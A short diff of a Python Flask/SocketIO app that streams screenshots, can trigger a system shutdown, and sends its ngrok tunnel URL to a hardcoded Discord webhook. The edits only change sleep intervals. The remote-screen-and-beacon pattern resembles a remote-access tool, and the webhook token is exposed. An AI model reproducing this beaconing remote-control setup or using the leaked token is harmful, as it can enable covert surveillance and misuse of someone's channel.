@@ -60,7 +60,7 @@ def continuous_action(button_id):
             os.system("shutdown /s /t 1")
             
             
-        time.sleep(0.25) 
+        time.sleep(0.5) 
 
 def take_screenshots():
     while True:
@@ -73,7 +73,7 @@ def take_screenshots():
         screenshot.paste(cursor_image, paste_position, cursor_image)
         screenshot.save(screenshot_path)
         socketio.emit('update_image', {'src': screenshot_path})
-        time.sleep(0.25)
+        time.sleep(0.5)
 
 @socketio.on('connect')
 def handle_connect():
@@ -107,4 +107,3 @@ if __name__ == '__main__':
     webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1277325619482591334/odNBwGAG9rfzNwPy2G2YDFlHusg_bfdKwhEvwnd79MdXspdGzg1b3wzZ1Bc2U9cmJiiq", content=" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:5000:{}/\"".format(public_url, port))
     webhook.execute()
     socketio.run(app, debug=False)
-    time.sleep(3)
